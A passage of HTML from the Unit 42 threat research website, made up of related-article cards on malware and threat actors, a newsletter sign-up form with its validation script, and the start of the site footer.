				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/advanced-backdoor-squidoor/" title="Squidoor: Suspected Chinese Threat Actor’s Backdoor Targets Global Organizations" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Squidoor: Suspected Chinese Threat Actor’s Backdoor Targets Global Organizations:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/02_Cybercrime_Category_1920x900-786x368.jpg" class="lozad" alt="Pictorial representation of Koi Stealer and RustDoor. Digital code in various shades of blue on a black background in the shape of a skull." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/02_Cybercrime_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/02_Cybercrime_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/02_Cybercrime_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/02_Cybercrime_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/02_Cybercrime_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:RustDoor and Koi Stealer for macOS Used by North Korea-Linked Threat Actor to Target the Cryptocurrency Sector:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2025-02-26T11:00:59+00:00">February 26, 2025</time></span>
                  <a href="https://unit42.paloaltonetworks.com/macos-malware-targets-crypto-sector/" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:RustDoor and Koi Stealer for macOS Used by North Korea-Linked Threat Actor to Target the Cryptocurrency Sector">
                    <h4 class="post-title">RustDoor and Koi Stealer for macOS Used by North Korea-Linked Threat Actor to Target the Cryptocurrency Sector</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/macos/" title="macOS" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:RustDoor and Koi Stealer for macOS Used by North Korea-Linked Threat Actor to Target the Cryptocurrency Sector:macOS">MacOS</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/infostealer/" title="Infostealer" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:RustDoor and Koi Stealer for macOS Used by North Korea-Linked Threat Actor to Target the Cryptocurrency Sector:Infostealer">Infostealer</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/contagious-interview/" title="Contagious Interview" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:RustDoor and Koi Stealer for macOS Used by North Korea-Linked Threat Actor to Target the Cryptocurrency Sector:Contagious Interview">Contagious Interview</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/macos-malware-targets-crypto-sector/" title="RustDoor and Koi Stealer for macOS Used by North Korea-Linked Threat Actor to Target the Cryptocurrency Sector" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:RustDoor and Koi Stealer for macOS Used by North Korea-Linked Threat Actor to Target the Cryptocurrency Sector:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/04_Malware_Category_1920x900-786x368.jpg" class="lozad" alt="Pictorial representation of new Linux malware Auto-color. Close-up view of a circuit board with illuminated red data streams and microchips, symbolizing advanced digital technology." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/04_Malware_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/04_Malware_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/04_Malware_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/04_Malware_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/04_Malware_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Auto-Color: An Emerging and Evasive Linux Backdoor:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2025-02-24T23:00:52+00:00">February 24, 2025</time></span>
                  <a href="https://unit42.paloaltonetworks.com/new-linux-backdoor-auto-color/" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Auto-Color: An Emerging and Evasive Linux Backdoor">
                    <h4 class="post-title">Auto-Color: An Emerging and Evasive Linux Backdoor</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/linux/" title="Linux" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Auto-Color: An Emerging and Evasive Linux Backdoor:Linux">Linux</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/backdoor/" title="backdoor" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Auto-Color: An Emerging and Evasive Linux Backdoor:backdoor">Backdoor</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/new-linux-backdoor-auto-color/" title="Auto-Color: An Emerging and Evasive Linux Backdoor" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Auto-Color: An Emerging and Evasive Linux Backdoor:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="292" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/09-3-Stately-Taurus-1616x600-1-786x292.png" class="lozad" alt="Pictorial representation of APT Stately Taurus. The silhouette of a bull and the Taurus constellation inside an orange abstract planet. Abstract, stylized cosmic setting with vibrant blue and purple shapes, representing space and distant planetary bodies." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/09-3-Stately-Taurus-1616x600-1-786x292.png 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/09-3-Stately-Taurus-1616x600-1-768x285.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/09-3-Stately-Taurus-1616x600-1-1536x570.png 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/09-3-Stately-Taurus-1616x600-1.png 1616w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-actor-groups/" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Stately Taurus Activity in Southeast Asia Links to Bookworm Malware:Threat Actor Groups"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/07/threat-actor-groups.svg" alt=" category icon">Threat Actor Groups</span></a>                        <span class="post-pub-date"><time datetime="2025-02-20T11:00:23+00:00">February 20, 2025</time></span>
                  <a href="https://unit42.paloaltonetworks.com/stately-taurus-uses-bookworm-malware/" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Stately Taurus Activity in Southeast Asia Links to Bookworm Malware">
                    <h4 class="post-title">Stately Taurus Activity in Southeast Asia Links to Bookworm Malware</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/stately-taurus/" title="Stately Taurus" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Stately Taurus Activity in Southeast Asia Links to Bookworm Malware:Stately Taurus">Stately Taurus</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/dll-sideloading/" title="DLL Sideloading" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Stately Taurus Activity in Southeast Asia Links to Bookworm Malware:DLL Sideloading">DLL Sideloading</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/bookworm/" title="Bookworm" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Stately Taurus Activity in Southeast Asia Links to Bookworm Malware:Bookworm">Bookworm</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/stately-taurus-uses-bookworm-malware/" title="Stately Taurus Activity in Southeast Asia Links to Bookworm Malware" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Stately Taurus Activity in Southeast Asia Links to Bookworm Malware:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/03_Malware_Category_1920x900-786x368.jpg" class="lozad" alt="Pictorial representation of macOS infostealers. Laptop on a desk displaying advanced cybersecurity software interface with vibrant red graphics, in a dimly lit room." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/03_Malware_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/03_Malware_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/03_Malware_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/03_Malware_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/03_Malware_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Stealers on the Rise: A Closer Look at a Growing macOS Threat:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2025-02-04T11:00:12+00:00">February 4, 2025</time></span>
                  <a href="https://unit42.paloaltonetworks.com/macos-stealers-growing/" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Stealers on the Rise: A Closer Look at a Growing macOS Threat">
                    <h4 class="post-title">Stealers on the Rise: A Closer Look at a Growing macOS Threat</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/macos/" title="macOS" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Stealers on the Rise: A Closer Look at a Growing macOS Threat:macOS">MacOS</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/infostealer/" title="Infostealer" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Stealers on the Rise: A Closer Look at a Growing macOS Threat:Infostealer">Infostealer</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/macos-stealers-growing/" title="Stealers on the Rise: A Closer Look at a Growing macOS Threat" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Stealers on the Rise: A Closer Look at a Growing macOS Threat:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/01/14_Overview_1920x900-786x368.jpg" class="lozad" alt="Digital representation of jailbreaking DeepSeek. A dynamic, multicolored wave pattern with luminous particles, set against a dark background." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/01/14_Overview_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/01/14_Overview_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/01/14_Overview_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/01/14_Overview_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/01/14_Overview_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Recent Jailbreaks Demonstrate Emerging Threat to DeepSeek:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2025-01-30T21:30:36+00:00">January 30, 2025</time></span>
                  <a href="https://unit42.paloaltonetworks.com/jailbreaking-deepseek-three-techniques/" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Recent Jailbreaks Demonstrate Emerging Threat to DeepSeek">
                    <h4 class="post-title">Recent Jailbreaks Demonstrate Emerging Threat to DeepSeek</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/llm/" title="LLM" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Recent Jailbreaks Demonstrate Emerging Threat to DeepSeek:LLM">LLM</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/jailbroken/" title="jailbroken" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Recent Jailbreaks Demonstrate Emerging Threat to DeepSeek:jailbroken">Jailbroken</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/genai/" title="GenAI" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Recent Jailbreaks Demonstrate Emerging Threat to DeepSeek:GenAI">GenAI</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/jailbreaking-deepseek-three-techniques/" title="Recent Jailbreaks Demonstrate Emerging Threat to DeepSeek" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Recent Jailbreaks Demonstrate Emerging Threat to DeepSeek:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/01/01_Hactivism_Overview_1920x900-786x368.jpg" class="lozad" alt="A pictorial representation of an espionage operation against high-value targets in South Asia. Digital artwork featuring an abstract blend of vibrant blue, pink, and black colors with fragments of HTML code visible, creating a dynamic and modern visual effect against a glitch effect photo of someone typing on a keyboard." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/01/01_Hactivism_Overview_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/01/01_Hactivism_Overview_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/01/01_Hactivism_Overview_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/01/01_Hactivism_Overview_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/01/01_Hactivism_Overview_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:CL-STA-0048: An Espionage Operation Against High-Value Targets in South Asia:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2025-01-29T23:00:17+00:00">January 29, 2025</time></span>
                  <a href="https://unit42.paloaltonetworks.com/espionage-campaign-targets-south-asian-entities/" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:CL-STA-0048: An Espionage Operation Against High-Value Targets in South Asia">
                    <h4 class="post-title">CL-STA-0048: An Espionage Operation Against High-Value Targets in South Asia</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/china/" title="China" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:CL-STA-0048: An Espionage Operation Against High-Value Targets in South Asia:China">China</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/cobalt-strike/" title="Cobalt Strike" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:CL-STA-0048: An Espionage Operation Against High-Value Targets in South Asia:Cobalt Strike">Cobalt Strike</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/mimikatz/" title="Mimikatz" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:CL-STA-0048: An Espionage Operation Against High-Value Targets in South Asia:Mimikatz">Mimikatz</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/espionage-campaign-targets-south-asian-entities/" title="CL-STA-0048: An Espionage Operation Against High-Value Targets in South Asia" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:CL-STA-0048: An Espionage Operation Against High-Value Targets in South Asia:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                    </div>
    </div>
    <div class="l-container bs__controls">
      <div class="bs__progress"><span></span></div>
      <div class="bs__navigation"> 
        <ul>
          <li> 
            <button id="prevButton"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/slider-arrow-left.svg" alt="Slider arrow"></button>
          </li>
          <li> 
            <button id="nextButton"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/slider-arrow-left.svg" alt="Slider arrow"></button>
          </li>
        </ul>
      </div>
    </div>
  </div>
 
        <div class="be-enlarge-modal" id="enlargedModal">
          <div class="be-enlarge-modal__wrapper"> 
            <figure> 
              <button class="close__modal" id="closeModal"> 
              <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/close-modal.svg" alt="Close button"></button>
              <img class="be__enlarged-image" id="enlargedImage" src="" alt="Enlarged Image">
              <figcaption> </figcaption>
            </figure>
          </div>
        </div>

      </div>
    </section>
  </main>
<!--  Start: Footer subscription form -->
<div class="newsletter">
      <div class="l-container">
        <div class="newsletter__wrapper">
          <div class="image__wrapper"> 
            <picture>
			                 <source class="lozad" media="(max-width:400px)" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/newsletter-Image-mobile.webp">
			  			                  <source class="lozad" media="(max-width:949px)" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/newsletter-Image-tab.webp">
			  			  			  	<img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/Revitalized_newsletter-Image-desktop-copy-1.webp" alt="Newsletter">
			              </picture>
          </div>
          <div class="content__wrapper"> 
		    							<span class="pre-title"> 
				<img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/palo-alto-logo-small.svg" alt="UNIT 42 Small Logo">
				Get updates from Unit 42			</span>
						           	 <h2>Peace of mind comes from staying ahead of threats. Contact us today.</h2>
			            <form action="https://www.paloaltonetworks.com/apps/pan/public/formsubmithandler.submitform.json" method="post" novalidate class="subscribe-form" name="Unit42_Subscribe" id="unit42footerSubscription_form">
              <input type="hidden" name="emailFormMask" value="">
              <input type="hidden" value="1086" name="formid">
              <input type="hidden" value="531-OCS-018" name="munchkinId">
              <input type="hidden" value="2141" name="lpId">
              <input type="hidden" value="1203" name="programId">
              <input type="hidden" value="1086" name="formVid">
              <input type="hidden" name="mkto_optinunit42" value="true">
              <input type="hidden" name="mkto_opt-in" value="true">
              <div class="form-group"> 
                <label for="newsletter-email"  id="newsletter-email-label">Your Email</label>
                <input type="emal" placeholder="Your Email" name="Email"  class="subscribe-field" id="newsletter-email" aria-labelledby="newsletter-email-label">
                <p class="error-mail mb-15 text-danger" style="color: #dc3545"></p>
				<p>Subscribe for email updates to all Unit 42 threat research.<br />By submitting this form, you agree to our <a title="Terms of Use" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use" data-page-track="true" data-page-track-value="Get updates from Unit 42:Terms of Use">Terms of Use</a> and acknowledge our <a title="Privacy Statement" href="https://www.paloaltonetworks.com/legal-notices/privacy" data-page-track="true" data-page-track-value="Get updates from Unit 42:Privacy Statement">Privacy Statement.</a></p>
                <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6Lc5EhgTAAAAAJa-DzE7EeWABasWg4LKv-R3ao6o"></div>
                <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Invalid captcha!</p>
                <button class="l-btn is-disabled" data-page-track="true" data-page-track-value="footer:Get updates from Unit 42:Subscribe" id="unit42footerSubscription_form_button"> 
					Subscribe					<img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/right-arrow.svg" alt="Right Arrow"  class="arrow">
					<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-loader.svg" alt="loader" class="loader">
			   </button>
				<div class="form-success-message"></div>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>

<script>

(function($) {
	// Migrated from the unit42-v5 + Modifications
	var subscribeSuccess = false;
	var email = document.getElementById('newsletter-email');
	var subscription_form = document.getElementById('unit42footerSubscription_form');
	var subscription_form_button = document.getElementById('unit42footerSubscription_form_button');
	window.captchaComplete = function() {
		subscribeSuccess = true;
		if ($(mail).val() != '' && isEmail($(mail).val())) {
			$(subscription_form_button).removeClass('is-disabled');
		}
		setTimeout(function() {
			$(email).focus();
			$('.g-recaptcha iframe').attr('tabindex', '-1');
		}, 100)
	}
	window.captchaExpires = function() {
		subscribeSuccess = false;
		$(subscription_form_button).addClass('is-disabled', true);
	} 
	$(subscription_form).submit(function(e) {
		e.preventDefault();
		e.stopImmediatePropagation();
		updateEmailMask();
		var success = true;
		var form = $(this);
		var mail = form.find('input[name="Email"]');
		
		if (mail.val() === '') {
			mail.addClass('has-error');
			showError(1);
			success = false;	
		}  else if (!isEmail(mail.val())){
			showError(2);
			success = false;
		}
		else {
			mail.removeClass('has-error');
			$('.error-mail').addClass('d-none');
		}

		if (!subscribeSuccess) {
			$('.error-recaptcha').removeClass('d-none');
		} else {
			$('.error-recaptcha').addClass('d-none');
		}

		if (success && subscribeSuccess) {
			$.ajax({
				type: 'POST',
				url: form.attr('action'),
				data: form.serialize(),
				beforeSend: function() {
                 form.find('button').addClass('is-loading');
    			},
				success: function(msg) {
					form.find('.form-success-message').html('<p class="success-message">You have been successfully subscribed</p>');
					form.find('button').removeClass('is-loading');
					$(email).val('');
					clearError();
				},
				error: function(jqXHR, textStatus, errorThrown) {
					$(subscription_form_button).addClass('is-disabled', true);
					form.find('button').removeClass('is-loading');
					
				}
			});
		}
		return false;
	});
	function showError(error_type){
		if(error_type == 1) {
			$('.error-mail').text("Please enter the email address.").addClass('error-show');
			$(subscription_form_button).addClass('is-disabled');
		} else if(error_type == 2){
			$('.error-mail').text("Please provide a valid e-mail address.").addClass('error-show');
			$(subscription_form_button).addClass('is-disabled');
		}	
		$(subscription_form_button).removeClass('is-loading');
	}
	function clearError(){
		$('.error-mail').text("").removeClass('error-show');;
		$(subscription_form_button).removeClass('is-loading');
		$(subscription_form_button).removeClass('is-disabled');
	}
	
	$(email).on('input', function (event) { 
		var email = $(this).val();
		if (isEmail(email) ) {			
			clearError();
		} else if(email == ""){
			clearError();
		} else{
			showError(2);			  
		}
    });

	function isEmail(email) {
		var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
		return re.test(String(email).toLowerCase());
	}
	
	var captcha_loaded = false;
         if(!captcha_loaded){
            // recaptcha on foucs call
            $(document).on('change paste keyup', '#newsletter-email', function () {
               if($('.g-recaptcha').hasClass('d-none')){
                $('.g-recaptcha').removeClass('d-none');
               }
               if(!captcha_loaded ){
                  captcha_loaded  = true;
                  // trigger loading api.js (recaptcha.js) script
                  var head = document.getElementsByTagName('head')[0];
                  var script = document.createElement('script');
                  script.type = 'text/javascript';
                  script.src = 'https://www.google.com/recaptcha/api.js?hl=en_US';
                  head.appendChild(script);
               }
            });
        }
	
	function updateEmailMask() {
		var email = $("#unit42footerSubscription_form input[name='Email']").val();
		if (email && email.trim() != '') {
			var maskedEmail = maskEmailAddress(email);
			$("#unit42footerSubscription_form input[name='emailFormMask']").val(maskedEmail);
		}
	}

	function maskEmailAddress (emailAddress) {
		function mask(str) {
			var strLen = str.length;
			if (strLen > 4) {
				return str.substr(0, 1) + str.substr(1, strLen - 1).replace(/\w/g, '*') + str.substr(-1,1);
			}
			return str.replace(/\w/g, '*');
		}
		return emailAddress.replace(/([\w.]+)@([\w.]+)(\.[\w.]+)/g, function (m, p1, p2, p3) {
			return mask(p1) + '@' + mask(p2) + p3;
		});

		return emailAddress;
	}

}(jQuery));
//# sourceMappingURL=main.js.map
	
</script>
<!--  End: Footer subscription form -->

<footer class="footer"> 
  <div class="footer-menu">
    <div class="l-container">
      <div class="footer-menu__wrapper">
        <div class="footer-menu-nav__wrapper">
                      <h3 class="footer-menu-nav__title">Products and services</h3>
                                <div class="nav-column__wrapper"> 
            <div class="nav-column">
              													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/network-security"   role="link" title="Network Security Platform" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform">Network Security Platform</a>
						</li>    
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/network-security/security-subscriptions"   role="link" title="CLOUD DELIVERED SECURITY SERVICES" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES">CLOUD DELIVERED SECURITY SERVICES</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/advanced-threat-prevention" target=_blank  role="link" title="Advanced Threat Prevention" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention">Advanced Threat Prevention</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/advanced-dns-security"   role="link" title="DNS Security" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security">DNS Security</a>
						</li>    
